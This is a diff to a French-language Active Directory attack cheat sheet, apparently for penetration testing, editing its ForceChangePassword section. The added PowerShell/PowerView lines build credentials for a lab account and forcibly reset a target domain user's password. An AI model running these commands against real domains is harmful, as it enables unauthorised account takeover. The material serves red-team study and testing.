@@ -40,10 +40,14 @@ Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -
 
 ### ForceChangePassword (modification du mot de passe)
 
+Windows
 ```powershell
+# Utilisation de credentials alternatifs
+$PrivilegedUserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $PrivilegedUserPassword)
 # Réinitialisation du password
-$pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
-Set-DomainUserPassword -Identity Target_AD_User -Password $pass
+$newPassword = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
+Set-DomainUserPassword -Identity Target_AD_User -Password $newPassword
 ```
 
 ### GenericWrite
